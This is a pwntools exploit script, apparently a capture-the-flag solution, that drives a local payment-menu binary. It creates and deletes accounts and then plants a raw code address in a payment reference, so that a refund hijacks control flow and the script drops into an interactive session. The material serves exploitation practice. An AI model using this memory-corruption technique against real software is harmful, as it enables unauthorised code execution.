#!/usr/bin/env python2
# coding = utf-8

from pwn import *
from LibcSearcher import *
context(arch = "amd64", os = "linux", log_level = "debug")

def send_choice(choice):
    p.recvuntil('> ')
    p.sendline(str(choice))

def add_account(name):
    send_choice(3)
    p.recvuntil('Enter account name: ')
    p.sendline(name)

def record_payment(message, money, receiver, sender):
    send_choice(4)
    p.recvuntil('Enter reference: ')
    p.sendline(message)
    p.recvuntil('Enter value: ')
    p.sendline(str(money))
    p.recvuntil('Enter id of recipient: ')
    p.sendline(str(receiver))
    p.recvuntil('Enter id of sender: ')
    p.sendline(str(sender))

def refund_payment(transaction_id, account_id):
    send_choice(5)
    p.recvuntil('Enter transaction id: ')
    p.sendline(str(transaction_id))
    p.recvuntil('Enter id of either account: ')
    p.sendline(str(account_id))

def delete_account(account):
    send_choice(6)
    p.recvuntil('Enter account id: ')
    p.sendline(str(account))


p = process('./server')
elf = ELF('./server')
gdb.attach(p, "")
add_account(b'A')
add_account(b'B')
record_payment(b'Transaction-Normal', 0, 0, 1)
delete_account(1)
record_payment(b'\xc9\x17\x40', 0, 0, 0)
refund_payment(0, 0)
p.interactive()
